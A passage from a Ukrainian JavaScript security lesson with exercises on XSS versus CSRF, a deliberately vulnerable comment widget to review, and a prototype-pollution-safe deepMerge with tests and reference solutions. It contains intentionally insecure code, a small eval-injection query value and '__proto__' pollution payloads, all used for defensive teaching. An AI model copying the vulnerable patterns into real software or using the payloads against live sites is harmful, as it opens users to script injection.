> Lockfile + `npm ci`/frozen lockfile у CI; мінімум залежностей; вимкнені install-скрипти з allowlist; затримка на свіжі релізи; 2FA і provenance для публікації; сканери й автоматичні PR оновлень з рев'ю; SRI для скриптів з CDN; найменші права токенів у CI.
>
> 📚 [[JavaScript - 30. Безпека в JavaScript#Ланцюжок постачання і секрети на клієнті|Розділ: supply chain]] · [OWASP: NPM Security Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/NPM_Security_Cheat_Sheet.html)

## 🛠️ Практика

> [!task] Поясни своїми словами: XSS vs CSRF
> level: middle · difficulty: easy · id: jsd-30-task-01 · tags: feynman, xss, csrf
>
> Поясни (до 6 речень), чим XSS відрізняється від CSRF: **чий код** виконується, **де**, і чому `HttpOnly` допомагає проти одного, але не проти іншого. Наведи по одному головному захисту для кожного.
>
> > [!hint]- Підказка 1
> > У XSS чужий код виконується на **твоїй** сторінці. А в CSRF?
>
> > [!hint]- Підказка 2
> > Чи потрібно атакувальнику в CSRF **читати** cookie?
>
> > [!solution]- Еталонне пояснення
> > XSS — це коли чужий скрипт виконується **всередині моєї сторінки**, з усіма правами мого коду: він читає DOM, сховища, робить запити як користувач. CSRF — коли чужа сторінка змушує браузер користувача **надіслати запит** на мій сайт, а браузер сам чіпляє cookie; чужий код при цьому на моїй сторінці не виконується і відповіді не бачить. `HttpOnly` заважає XSS **вкрасти** cookie, але проти CSRF марний: атакувальнику не треба її читати — браузер додасть її сам. Головний захист від XSS — не вставляти недовірені дані як HTML/JS (`textContent`, санітизація) плюс strict CSP. Від CSRF — `SameSite=Lax/Strict` плюс токен або перевірка `Sec-Fetch-Site`.

> [!task] Знайди вразливості у віджеті коментарів
> level: senior · difficulty: medium · id: jsd-30-task-02 · tags: xss, postmessage, security-review
>
> Знайди всі проблеми безпеки (їх п'ять) і перепиши код.
>
> ```js
> localStorage.setItem('session', token);
>
> function renderComment(c) {
>   return `<div class="comment">
>     <a href="${c.authorUrl}">${c.author}</a>
>     <p>${c.text}</p>
>   </div>`;
> }
> list.innerHTML = comments.map(renderComment).join('');
>
> window.addEventListener('message', (e) => {
>   if (e.data.type === 'theme') document.body.innerHTML += e.data.banner;
> });
>
> const sort = new URLSearchParams(location.search).get('sort');
> setTimeout(`applySort("${sort}")`, 0);
> ```
>
> ```js starter
> // Знайди 5 проблем і перепиши
> localStorage.setItem('session', token);
>
> function renderComment(c) {
>   return `<div class="comment">
>     <a href="${c.authorUrl}">${c.author}</a>
>     <p>${c.text}</p>
>   </div>`;
> }
> list.innerHTML = comments.map(renderComment).join('');
>
> window.addEventListener('message', (e) => {
>   if (e.data.type === 'theme') document.body.innerHTML += e.data.banner;
> });
>
> const sort = new URLSearchParams(location.search).get('sort');
> setTimeout(`applySort("${sort}")`, 0);
> ```
>
> > [!hint]- Підказка 1
> > Пройди кожен source (коментарі з API, `e.data`, `location.search`) до його sink.
>
> > [!hint]- Підказка 2
> > Не забудь `href` — HTML-екранування його не рятує — і де лежить токен.
>
> > [!solution]- Еталонне рішення
> > Проблеми: (1) `c.author` і `c.text` у `innerHTML` — stored XSS; (2) `c.authorUrl` у `href` — `javascript:`-XSS; (3) обробник `message` без перевірки `e.origin` пише в `innerHTML` — DOM-XSS через `postMessage`; (4) рядок у `setTimeout` з параметра URL — `eval`-ін'єкція (`?sort=");alert(1);("`); (5) сесійний токен у `localStorage` — будь-який XSS його вкраде (краще `HttpOnly`-cookie від сервера).
> >
> > ```js
> > // (5) токен ставить сервер: Set-Cookie: __Host-session=…; HttpOnly; Secure; SameSite=Lax; Path=/
> >
> > function safeHref(input) {
> >   try {
> >     const url = new URL(input, location.origin);
> >     return ['http:', 'https:'].includes(url.protocol) ? url.href : '#';
> >   } catch {
> >     return '#';
> >   }
> > }
> >
> > function renderComment(c) {
> >   const div = document.createElement('div');
> >   div.className = 'comment';
> >   const a = document.createElement('a');
> >   a.href = safeHref(c.authorUrl);          // (2)
> >   a.rel = 'noopener noreferrer ugc';
> >   a.textContent = c.author;                // (1)
> >   const p = document.createElement('p');
> >   p.textContent = c.text;                  // (1)
> >   div.append(a, p);
> >   return div;
> > }
> > list.replaceChildren(...comments.map(renderComment));
> >
> > window.addEventListener('message', (e) => {
> >   if (e.origin !== 'https://themes.example') return;              // (3)
> >   if (e.data?.type !== 'theme' || typeof e.data.banner !== 'string') return;
> >   banner.textContent = e.data.banner;
> > });
> >
> > const SORTS = new Map([['date', sortByDate], ['rating', sortByRating]]); // (4) allowlist
> > const sort = new URLSearchParams(location.search).get('sort');
> > setTimeout(() => (SORTS.get(sort) ?? sortByDate)(), 0);
> > ```
> >
> > `Map` замість об'єкта — свідомо: `SORTS['__proto__']` у звичайному об'єкті повернув би `Object.prototype`. Шар захисту поверх: strict CSP з Trusted Types знайшов би (1), (3) і (4) ще до код-рев'ю.

> [!task] Злиття об'єктів без prototype pollution
> level: senior · difficulty: hard · id: jsd-30-task-03 · tags: prototype-pollution, objects
>
> Напиши `deepMerge(target, ...sources)`: рекурсивно зливає **plain**-об'єкти (прототип `Object.prototype` або `null`), масиви й інші значення копіює «як є» (масиви — поверхневою копією), ігнорує не-plain джерела. Жоден вхід не має змінювати жоден прототип.
>
> ```js
> deepMerge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'));
> deepMerge({}, JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}'));
> console.log({}.isAdmin);                                          // → undefined
> console.log(deepMerge({ a: { x: 1 }, list: [1] }, { a: { y: 2 }, list: [2, 3] }));
> // → { a: { x: 1, y: 2 }, list: [ 2, 3 ] }
> ```
>
> ```js starter
> const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype'])
>
> function deepMerge(target, ...sources) {
>   // твій код
> }
> ```
>
> ```js tests
> const clean = () => { delete Object.prototype.isAdmin }
>
> test('рекурсивно зливає plain-об\'єкти, масиви замінює копією', () => {
>   const list = [2, 3]
>   const out = deepMerge({ a: { x: 1 }, list: [1] }, { a: { y: 2 }, list })
>   expect(out).toEqual({ a: { x: 1, y: 2 }, list: [2, 3] })
>   expect(out.list).not.toBe(list)
> })
>
> test('__proto__ з JSON не забруднює прототип', () => {
>   const out = deepMerge({}, JSON.parse('{"__proto__": {"isAdmin": true}}'))
>   const polluted = {}.isAdmin
>   clean()
>   expect(polluted).toBeUndefined()
>   expect(Object.getPrototypeOf(out)).toBe(Object.prototype)
> })
>
> test('constructor.prototype теж не пробивається', () => {
>   deepMerge({}, JSON.parse('{"constructor": {"prototype": {"isAdmin": true}}}'))
>   const polluted = {}.isAdmin
>   clean()
>   expect(polluted).toBeUndefined()
> })
>
> test('не-plain джерела ігноруються, не-plain значення копіюються як є', () => {
>   const date = new Date(0)
>   const out = deepMerge({ keep: 1 }, null, [1, 2], new Date(), { at: date })
>   expect(out).toEqual({ keep: 1, at: date })
>   expect(out.at).toBe(date)
> })
>
> test('кілька джерел зліва направо і об\'єкти без прототипу', () => {
>   const bare = Object.assign(Object.create(null), { b: { z: 1 } })
>   const out = deepMerge({ a: 1, b: { y: 0 } }, { a: 2 }, bare)
>   expect(out).toEqual({ a: 2, b: { y: 0, z: 1 } })
> })
> ```
>
> > [!hint]- Підказка 1
> > `for…in` обходить і успадковані ключі. Яка альтернатива дає лише власні?
>
> > [!hint]- Підказка 2
> > Небезпечні ключі — `__proto__`, `constructor`, `prototype`. А ще `target[key]` може прочитати **успадковане** значення (`target.constructor === Object`) — перевіряй `Object.hasOwn`.
>
> > [!solution]- Еталонне рішення
> > ```js
> > const FORBIDDEN = new Set(['__proto__', 'constructor', 'prototype']);
> >
> > const isPlainObject = (v) => {
> >   if (typeof v !== 'object' || v === null) return false;
> >   const proto = Object.getPrototypeOf(v);
> >   return proto === Object.prototype || proto === null;
> > };
> >
> > function deepMerge(target, ...sources) {
> >   for (const source of sources) {
> >     if (!isPlainObject(source)) continue;
> >     for (const key of Object.keys(source)) {          // лише власні перелічувані
> >       if (FORBIDDEN.has(key)) continue;
> >       const value = source[key];
> >       if (isPlainObject(value)) {
> >         const base = Object.hasOwn(target, key) && isPlainObject(target[key]) ? target[key] : {};
> >         target[key] = deepMerge(base, value);
> >       } else {
> >         target[key] = Array.isArray(value) ? [...value] : value;
> >       }
> >     }
> >   }
> >   return target;
> > }
> > ```
> >
> > Чому працює: `__proto__` ніколи не стає ключем присвоєння; `Object.hasOwn` не дає «провалитися» в успадкований `target.constructor`; рекурсія йде лише в plain-об'єкти, тож `Date`, класи й функції не розбираються на частини. Для довільних ключів-словників (наприклад, id користувачів) надійніше зберігати дані в `Map`.

## 📚 Джерела та що почитати

- 🟢 [MDN — Web security](https://developer.mozilla.org/en-US/docs/Web/Security) — огляд моделей атак і захистів у браузері.
- 🟢 [OWASP — Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html) — правила екранування за контекстом.
- 🟡 [OWASP — DOM based XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html) — sources, sinks і безпечні API у фронтенді.
- 🟡 [web.dev — Mitigate XSS with a strict CSP](https://web.dev/articles/strict-csp) — покроково про nonce і `'strict-dynamic'`.
- 🟡 [web.dev — Prevent DOM-based XSS with Trusted Types](https://web.dev/articles/trusted-types) — як впровадити Trusted Types у живий проєкт.
- 🟡 [OWASP — CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) — токени, SameSite, Fetch Metadata.
- 🔴 [PortSwigger — Prototype pollution](https://portswigger.net/web-security/prototype-pollution) — механіка, гаджети, лабораторні для практики.
- 🔴 [CISA — Widespread Supply Chain Compromise Impacting npm Ecosystem](https://www.cisa.gov/news-events/alerts/2025/09/23/widespread-supply-chain-compromise-impacting-npm-ecosystem) — розбір хробака Shai-Hulud і рекомендації.
- 🛠️ [DOMPurify](https://github.com/cure53/DOMPurify) — стандартний санітайзер HTML для браузера.
- 🛠️ [CSP Evaluator](https://csp-evaluator.withgoogle.com/) — перевірка твоєї політики CSP на слабкі місця.

> [!important] Підсумок
> - Корінь більшості атак — недовірені дані, що потрапили в інтерпретатор (HTML, JS, URL); думай у термінах source → sink і меж довіри.
> - XSS: `textContent` замість `innerHTML`, перевірка протоколу URL, DOMPurify/`setHTML`, strict CSP на nonce і Trusted Types; `HttpOnly` зменшує шкоду.
> - CSRF закривають `SameSite`, токени й `Sec-Fetch-Site`; clickjacking — `frame-ancestors`; `postMessage` — точний `targetOrigin` і перевірка `event.origin`; чужий контент — у `<iframe sandbox>`.
> - Prototype pollution — через ключі `__proto__`/`constructor` у наївному merge; ReDoS — через вкладені квантифікатори; `eval` — завжди червоний прапорець.
> - Залежності — частина твого коду: lockfile, мінімум пакетів, обмежені install-скрипти; секретів на клієнті не буває.
